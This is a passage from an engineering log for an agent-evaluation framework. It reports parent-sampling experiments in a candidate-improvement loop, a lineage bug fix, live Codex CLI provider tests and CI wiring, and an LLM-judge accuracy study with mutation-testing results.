proposer's request and nothing else — and **0** for the rule-based arms, with
the call counter capped at 0 to prove it.

| proposer | arm | turns | kept | reverted | distinct parents | from a rejection | **kept from one** | calls |
|---|---|---|---|---|---|---|---|---|
| rule_based | greedy | 2 | 0 | 2 | 1 | 0 | **0** | 0 |
| rule_based | sampling | 3 | 0 | 3 | 2 | 2 | **0** | 0 |
| llm | greedy | 8 | 1 | 7 | 2 | 0 | **0** | 8 |
| llm | sampling | 8 | 1 | 7 | 6 | 5 | **0** | 8 |

Both LLM arms kept exactly one candidate — turn 1, from the root, 0.4545 →
0.8182 — and then went flat for seven turns, every later candidate scoring
*exactly* the incumbent and dying to G3's cohort comparison.

**The number J0b asked for is 0, and the denominator is the finding.** Greedy
proposed from a rejected member 0 times in 8 turns, because it cannot. Sampling
did it **5 times**, three generations deep, and all five descendants were
themselves rejected. That is a stronger null than ADR 0160's, where the
statistic was 0 in both arms only because nothing was ever kept: here the arms
kept, the mechanism ran five times, and it did not pay.

The rule-based arms make the ceiling mechanical rather than statistical:
`cycle` takes `proposals[0]` and `find_constants` returns `RETRY_BUDGET` first,
so from *any* parent the proposal raises `RETRY_BUDGET` and never
`QUALITY_THRESHOLD`. Sampling walks a longer line than greedy and it is the
same line. **Parent diversity is worth nothing when the proposer's output is a
deterministic function of the parent.**

**A defect found by running.** The greedy arm reported `kept: 0` for a run
whose turn 1 had kept a candidate. `run_loop` writes each member twice — once
gated, once at the end of the run that proposed from it, carrying the children
count — and the fold took the LAST record wholesale; the closing record of a
*resumed root* is built with `parent_ref=None`, so it overwrote the
candidate's own parent and verdict with nulls:

```
20260905T103745 turn 1  a4d0bfe46fb4  parent c01e9b0659c7  kept True  escalate
20260905T104214 turn 0  a4d0bfe46fb4  parent -             kept True  None
```

`archive.fold_lineage` is now THE fold — first record per ref, largest
children count — shared by the driver, the CLI and the rig, and being
reader-side it repairs every lineage file already on disk.

`aef loop lineage list` prints members, parents, scores, verdicts, children
and `sampleable`, where `sampleable` is `_parent_weight` itself plus
`_resume_lineage`'s ref check rather than a second opinion that could drift
from the sampler. It prints the negative — `no kept member descends from a
rejected one` — because this increment's result is one. It builds no config
and loads no graph, so it works after a run that could not start.

4 mutations, 4 caught, restores SHA-1-verified. 18 tests. Registered in
`make measure` as `j2b-archive` (6 rows, zero live calls). **Dimension 6:
7 → 8.** `sample_parents` stays off and is still not deleted — on a third
measurement, and now with a stated experiment that would overturn the answer:
a rig where a rejection is on the path to a keep *and* the proposer can take
the second step. This one had the first and not the second.


## N10 — the Codex path runs here, and in CI where it can (ADR 0199)

J0b: *"the Codex path is never exercised against the real CLI — its only live
test is one of the three skips."* Two problems wearing one sentence. ADR 0131
did run it; and no CI job ever set the opt-in, so on every push the path was
exercised **nowhere**.

```
$ codex --version
codex-cli 0.153.2
$ AEF_LIVE_HARNESS=1 pytest -q tests/providers/test_codex_live.py
.                                                                        [100%]
1 passed in 4.87s
```

Then the half that decides an adopter's containment story. `codex exec` has no
system-prompt flag, so the persona goes in the USER turn and ADR 0152's
sentence is FALSE on this backend — and every previous assertion that
`PromptAgentNode` records that was against a `_Declaring` fake whose
`isolation` was a hard-coded frozenset, which proves the node reacts to a
declaration, not that the real provider makes one. A real `Graph`,
`GraphExecutor` and `CodexProvider` over the real binary now assert it end to
end: `user_turn_persona` and `read_only_fs` present, **`no_tools` and
`single_turn` absent** — the two `claude_code` earns and this argv does not
send, so a record claiming them would be ADR 0169's defect restored — the
`prompt_agent.persona_in_user_turn` warning, and `state.errors == []` because
it is the provider's property and never the run's error. `2 passed in 9.24s`.

`ci.yml` gains `live-harness`. `runs-on: ${{ vars.AEF_LIVE_RUNNER ||
'ubuntu-latest' }}` so an owner can aim it and it is never unschedulable.
Detection is two questions — is the CLI on PATH (cheap, certain) and is there
a credential, in the two forms one actually takes: a repository secret, or the
CLI's own auth file. The guard is on the **target list**, not a boolean, so a
runner with codex and no claude runs codex. Run under four runner shapes,
including the honest miss: this box's Claude login is a Keychain entry rather
than a file, so the detector reports no credential and under-runs rather than
guessing at a third form. The empty case prints which backend was missing and
the two ways to fix it — a silent skip being exactly the failure ADR 0188
found in this repo's own nightly.

The test extracts the detection shell **from the workflow** and runs it, so the
two cannot drift. Its own first draft had the defect it exists to prevent: two
tests called `shutil.which("codex")` and skipped without it, so on every CI
runner they would have been skips. M7 — "the detector selects a CLI with no
credential" — was **NOT CAUGHT** until a stubbed `codex` on PATH removed the
skip. 3 mutations, 3 caught after that.

Two stale docstrings retracted: `CodexProvider` no longer says its parsing is
a hypothesis, and its `isolation` property no longer says the adapter has
never been run. **Dimension 8: 4 → 5.**

## P3 — the judge, on a set a word count cannot grade (ADR 0202)

Worker P3 of `TO_95_LOOP.md`. Dimension 3 was 8/10 for one reason: *"the judge
has only been scored where 15 of 18 cases pass"*, and the one real failure
family ADR 0171 added was word-cap overruns — which `len(summary.split()) >
cap` detects without a model at all. So on the evidence in this repo, the +1
ADR 0171 took is consistent with the judge being a word counter, and nothing
had distinguished the two.

**The hard set.** Six passages from `corpus/`, each contributing a matched
pair: the agent's own recorded summary verbatim from the cassette, and that
summary with ONE minimal owner-authored edit. Six families, chosen before any
of them was written — a correct number with the wrong unit (`340mm` →
`340cm`), the superseded figure reported as the result (£2.4m and £3.1m
swapped), two entities swapped (Hessle **Low** and **High** Mill), a right
conclusion with a fabricated cause, the dropped clause that reverses the
finding (the refusal RATE fell while the count rose), and a confident claim
the passage explicitly withdraws (a September reopening that had already
slipped). The judged state is the real scenario's `reflect` `input_state` with
`working_memory.summary` replaced and nothing else touched.

**Every one of the twelve is within its own word cap** — `--build` refuses to
write the file otherwise — so pass-everything, fail-everything and a
word-count-only judge each score exactly **6/12**. That is the control that
makes it a fair test, and it is a computed number in the report rather than an
argument.

**The negatives are AUTHORED, not observed, and the ADR says so repeatedly.**
ADR 0171 recorded nineteen runs against deliberately trappy passages precisely
to get content negatives and got none — *"every content trap was handled
correctly"*. They cannot be recorded from this agent at this cap range. So
this grades the judge; no number in it is an agent failure rate.

| instrument | agrees with the owner's labels |
|---|---|
| answer "pass" to everything | 6/12 |
| answer "fail" to everything | 6/12 |
| word count against the cap only | 6/12 |
| the corpus's own inherited regex checks | **9/12** |
| `RuleBasedJudge` (no model call) | 6/12, constant 0.000 |
| **`LLMJudge`, session default** | **12/12**, AUC **1.000**, paired **6/6**, max position delta **0.100** |
| `LLMJudge`, `claude-sonnet-5` (disinterested) | 11/12, AUC 1.000, paired 6/6, max position delta **0.550** |

Three of the six content failures satisfy every `TaskCheck` in their scenario
— the required terms and the required figure are all present, in the wrong
places — and the judge scores those three 0.065, 0.150 and 0.175. That is the
concrete answer to "what does a judge buy over a regex" on this set: three
cases, and they are the three where the wrong answer looks most right.

**Self-preference on the GRADING path: +0.025** (Opus judging its own writing,
against the disinterested judge on identical cases), where ADR 0162 measured
+0.260 on the *comparing* path. Absent, measured, not assumed.

**The choosing-path control**, which is ADR 0162's own unclaimed clause.
`aef/harness/loop.py` was another worker's file this wave, so the loop's
choosing act (`proposal = proposals[0]`) was not touched; what was measured is
the shipped `PairwiseRanker` performing a choice whose outcome is scored —
which of the two summaries to keep. Both judges **6/6**, both **0/6**
position-inconsistent, and the self-ranking guard refuses on that act both ways
round: **0 calls** when the judge model is declared, **1 call** when it is
`""` (this repo's own default) and only the answer names it. Choosing was the
steadier instrument of the two: the disinterested judge made its single
grading error and both its >0.5 position deltas on the grading path, and none
at all on the choosing path. What wiring the ranker into `cycle` would take is
written down in the ADR in four numbered steps, the fourth being that
proposals are compared on a *predicted* effect and a 6/6 measured on summaries
would not license it.

**Falsifications**, pre-registered in `docs/research/i14b/prereg.txt` before
the first preflight: F1 (beats the trivial baselines on agreement AND AUC AND
the paired statistic) HELD on all three with margin; F2 (position delta ≤ 0.20)
HELD at 0.100 for the arm the repo ships and **BREACHED at 0.550 by the
disinterested control** — the pre-registration did not say which arm, the ADR
discloses that and says the stricter reading makes this +1 rather than +2; F3
(self-preference absent, or present-and-mitigated) HELD on the first branch.
The fourth outcome named in advance — "beats the trivial baselines and still
loses to the corpus's regex checks" — did not fire.

75 live calls of the 90 allowed: 2 preflights, 48 grading, 24 choosing, 1 for
the guard demonstration. No retries, no failures, every `stop_reason`
`end_turn`, and — against ADR 0159's 1-in-36 and ADR 0171's 1-in-34 — **no
model misattribution**: 24 calls resolved to `claude-opus-5[1m]` and 24 to
`claude-sonnet-5`.

**Mutations**, against `tests/reasoning/test_i14b_hardset.py`; perturb, RUN,
restore from a sha256-verified byte backup, control green before and after.

| # | mutation | result |
|---|---|---|
| M1 | push one negative over its cap | 5 failed — CAUGHT |
| M2 | relabel one negative `owner_pass` (unbalancing the set) | 2 failed — CAUGHT |
| M3 | a positive that is not the recorded summary | 2 failed — CAUGHT |
| M4 | an edit's span no longer occurs in the summary | 2 failed — CAUGHT |
| M5 | copy an inherited-check verdict forward | 2 failed — CAUGHT |

**Three defects reported and not fixed** (outside this worker's files):
`MAX_ANSWER_CHARS = 600` truncates the source passage, so on any passage over
600 characters the judge is asked whether a claim is supported by a source it
can only partly see — this measurement selected around it; `max_words` never
reaches the judge's evidence at all (`_evidence` admits strings only, and
`max_words` is an int), so ADR 0171's mechanism sentence about the judge
"counting against the cap it can see in the evidence" is wrong in its
mechanism though not in its numbers — the cap arrives through
`state.objective`; and the disinterested judge scored a kiln leaning 340
**centimetres** instead of millimetres at 0.625, above its own threshold —
unit errors are the family both judges are weakest on.

**Dimension 3: 8 → 10.**

## P4 — the stepping stone paid, once the ladder was on the proposer's axis (ADR 0203)

Worker P4. **A kept candidate descends from a candidate the gates rejected** —
the sentence ADRs 0121, 0160 and 0198 each looked for and none could write.

ADR 0198 had named the reason exactly: `cycle` takes `proposals[0]` and
`find_constants` returns constants in source order, so the rule-based proposer
walks ONE axis deterministically. That was read for two nights as a dead end.
It is not: it says the ladder has to be on **that** axis, and `agents/demo`'s
is two-dimensional by construction, because the two-constant shape is what
lets it beat a one-constant control cohort.

`agents/ladder` (new; `agents/demo` untouched, so ADR 0198's measurement still
re-derives on the fixture it was made on). `BATCH_SIZE` first in the file, a
floor from the item count and a ceiling from a five-slot transport frame that
is a literal in the body rather than a module constant, so neither the
proposer nor the cohort can tune it. The trade is stated: the demo beats the
cohort by requiring coherence across two constants, which this fixture cannot
use because the proposer cannot produce it; it beats the cohort by making the
target **narrow** instead, which is a weaker guarantee and leaves the null
hypothesis able to reject.

**The staircase, measured through `aef loop score` and published before any
arm ran** (`docs/research/j2c/staircase.txt`):

```
BATCH_SIZE 3   0.5556   the blessed baseline
BATCH_SIZE 4   0.5556   EXACTLY the baseline — a step that gains nothing
BATCH_SIZE 5   0.7778   the rung: both `hard-5` scenarios complete
BATCH_SIZE 6   0.0000   over the five-slot frame; everything fails
```

`coerce_value` steps 3→4 and 4→5. Greedy's parent is the kept ref, the kept
ref never moves, so greedy proposes 4, has it rejected by G3, proposes 4 again
and stops on the duplicate-rejected-tree rule. **Greedy cannot reach 5 — a
proof, not a probability.** The rung at 5 is reachable only from the rejected 4.

Seeds 0–9, both arms, `rule_based` proposer, 6 turns, **0 live calls** under a
counter capped at 0:

| arm | runs | kept | descendants of a rejected member | kept from one | reached rung 5 |
|---|---|---|---|---|---|
| greedy | 10 | 0 | 0 | **0** | 0 |
| sampling | 10 | 8 | 8 | **8** | 8 |

Every keeper scores 0.7778 from a parent scoring 0.5556 marked `reject` — the
rung the probe predicted, which was the third clause of the pre-registered
falsification so that a lucky keep could not be counted as a climb. The two
sampling seeds that did not climb drew the ROOT at turn 2 and re-proposed the
already-rejected tree; the pre-registration put P(drawing the stone) at ≈ 0.72
from `_parent_weight`'s own arithmetic before the sweep, and 8 of 10 is what
that predicts. The cohort blocked none of the eight, which is luck in this
measurement's favour and is stated as such.

`sampling/seed0` also shows the other half in consecutive turns: turn 2 climbs
to rung 5 and turn 3 walks off the cliff at rung 6, where **G2's zero-tolerance
regression rule** catches it. Parent sampling makes a search wider; it does
nothing to make it safer.

**A defect found by RUNNING.** The first sweep reported
`stepping_stone_keeps = 0` in BOTH arms — ADR 0198's headline, from a rig
built to break it. `python` was not on `PATH`, so G1 rejected every candidate
before any behavioural gate ran, every rejection was scored `None`, and
`_parent_weight`'s zero for an unscored reject (*"recorded, never a parent"*,
ADR 0160) collapsed the sampling arm onto the greedy one. A null result from a
broken harness is indistinguishable from a null result about the subject at
the level of the headline number, and distinguishable only in the turn log —
which is the argument for committing turn-level records rather than summaries.

**`sample_parents` stays off by default and is NOT deleted.** ADR 0198 set the
deletion condition in advance — *"if a rig with both halves is built and
sampling still buys nothing there, that is the run that deletes it"*. This rig
has both halves and sampling bought 8. What changes is the sentence beside the
default: from "a measured null result with a stated experiment that would
overturn it" to **"a mechanism measured to pay when, and only when, the
landscape has a plateau on the axis the proposer walks and a better position
beyond it"** — and `--probe` is how an owner finds out whether theirs does, in
zero calls.

**Mutations**, against `tests/harness/test_ladder_staircase.py`:

| # | mutation | result |
|---|---|---|
| M1 | `BATCH_SIZE` moved below a decoy constant | 1 failed — CAUGHT |
| M2 | raise the frame ceiling; rung 6 stops collapsing | 3 failed — CAUGHT |
| M3 | shift the predicate so rung 4 is not neutral | 5 failed — CAUGHT |
| M4 | `RuleBasedProposer.step` 0.25 → 1.0 | 1 failed — CAUGHT |
| M5 | a keeper whose parent was KEPT, counted as a stone | 1 failed — CAUGHT |

5 of 5, **on the second pass, and both first-pass escapes were real.** M4
escaped because the test wrote `step = 0.25` as a local literal with a comment
naming `RuleBasedProposer.step` — a test that re-declares the constant it
names asserts nothing about the code; it now reads the shipped attribute. M2
escaped on a stale `.pyc`: `320 // 64` and `640 // 64` are the same number of
bytes and CPython invalidates on mtime-in-seconds plus size, so the mutation
silently re-ran the original bytecode. That is ADR 0198's own trap in a third
place, and any harness here that rewrites a Python file and immediately
imports it needs `PYTHONDONTWRITEBYTECODE`.

**Dimension 6: 8 → 10.**
